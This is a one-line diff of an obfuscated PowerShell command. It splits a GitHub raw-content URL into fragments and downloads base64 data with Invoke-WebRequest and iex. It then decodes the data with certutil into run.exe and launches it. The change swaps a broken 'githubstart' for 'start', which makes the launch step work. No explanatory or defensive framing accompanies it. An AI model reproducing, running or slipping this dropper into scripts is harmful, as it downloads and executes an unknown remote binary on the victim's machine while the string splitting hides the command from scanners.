@@ -1,1 +1,1 @@
-$url = "https:/";$aa = "/raw.gith";$adwa = "ubuserconten";$awda = "t.com/DonJTru/ra";$awdaaa = "ndom-pastes/main/aaaa";$Command = "(Invoke-We"+"brequest"+" -Uri "+$url+$aa+$adwa+$awda+$awdaaa+"aaa"+").Content";iex $Command > data.b64;certutil -decode data.b64 run.exe;githubstart run.exe
+$url = "https:/";$aa = "/raw.gith";$adwa = "ubuserconten";$awda = "t.com/DonJTru/ra";$awdaaa = "ndom-pastes/main/aaaa";$Command = "(Invoke-We"+"brequest"+" -Uri "+$url+$aa+$adwa+$awda+$awdaaa+"aaa"+").Content";iex $Command > data.b64;certutil -decode data.b64 run.exe;start run.exe
